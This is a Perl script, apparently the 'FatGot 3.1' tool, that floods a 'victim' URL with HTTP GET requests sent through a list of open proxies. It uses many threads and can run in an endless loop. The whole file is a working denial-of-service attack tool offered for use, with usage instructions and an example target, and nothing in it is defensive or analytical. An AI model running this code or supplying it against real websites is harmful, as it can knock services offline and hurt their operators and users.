#!/usr/bin/perl -w
use Thread;
use Socket;
use IO::Handle;
use Getopt::Long;

$|=1;


#funtion for http connection
sub http_connect($){
	$proxy_name=shift;
	
	$proxy_bak=$proxy_name;
	$proxy_bak=~/(.*):(.*)/;
	$proxy_ip=$1;
	$proxy_port=$2;
	
	$url_bak=$url;
	
	if($url_bak=~/^http:\/\//){
		;
	}else{
		$url_bak='http://'.$url_bak;
	}

	if($url_bak=~/^http:\/\/(.*)\//){
		$host_string=$1;
	}else{
		if($url_bak=~/^http:\/\/(.*)/){
			$host_string=$1;
			$url_bak=$url_bak.'/';
		}
	}

	$request=
	"GET $url_bak HTTP/1.1\n".
	"Host: $host_string\n".
	"Keep-Alive: 300\n".
	"Proxy-Connection: keep-alive\n\n\n";
	
	$remote_host=inet_aton($proxy_ip);
	$remote=sockaddr_in($proxy_port, $remote_host);

	socket(SOCK,AF_INET,SOCK_STREAM,6) || die "Error : Cannot create socket with PROXY \'$proxy_ip:$proxy_port\'!\n";

	connect(SOCK,$remote) || die "Error : Cannot connect PROXY \'$proxy_ip:$proxy_port\'!\n";

	SOCK->autoflush(1);

	print "Now use PROXY \'$proxy_ip:$proxy_port\' to KICK \'$url_bak\'!\n";
	
	print SOCK "$request";

	close(SOCK);

	return;
}


#funtion for run
sub do_it($){
	$proxy_single=shift;
	Thread->self->detach;
	#print "$proxy_single\n";
	&http_connect($proxy_single);
	return;
}


Getopt::Long::GetOptions(
	'tr=i' => \$thr,
	't=i' => \$timeout,
	'c=i' => \$cycles,
	'u=s' => \$url);


if((!defined($timeout)) || (!defined($thr)) || (!defined($url))){
print <<EOF;
Tips:
	FatGot version 3.1 CopyRight by demonalex[at]dark2s[dot]org
	
Usage:
	$0 -tr threads -t timeout -u victim_url [-c cycles]
	
Parameter Description:
	-tr			[Integer], Instantaneous number of threads.
	-t			[Integer], Batch cycle time-out value.
	-u			[String], Url of victim.
	-c			[Integer], Cycles for attack, If 0 is an infinite loop. 
	
Proxylist File:
	proxylist.txt
	Contents of the file format:
		ProxyServer:ProxyPort
	
Example:
	$0 -tr 5 -t 10 -u http://www.xxx.com/test.asp?id=10 -c 0
EOF
exit(1);
}


if(!defined($cycles)){
	$cycles=1;
}

#read proxy list
open(PROXY, "proxylist.txt");
@proxylist=<PROXY>;
chomp(@proxylist);
$proxycount=@proxylist;
print "You have $proxycount proxies, And $cycles cycles!\n";
close(PROXY);


if($cycles==0){
	$j=-1;
}else{
	$j=0;
}


for($i=$j;$i<$cycles;$i++){

#read proxy
$count1=0;

foreach $proxy (@proxylist){
	if($count1==$thr){
		sleep($timeout);
		$count1=0;
	}
	#&do_it($proxy);
	Thread->new(\&do_it,$proxy);
	$count1++;
}


#sleep for waiting the last thread
sleep(10);

if($cycles==0){
	$i=-2;
}

}

print "Attacks Over!\n";
exit(1);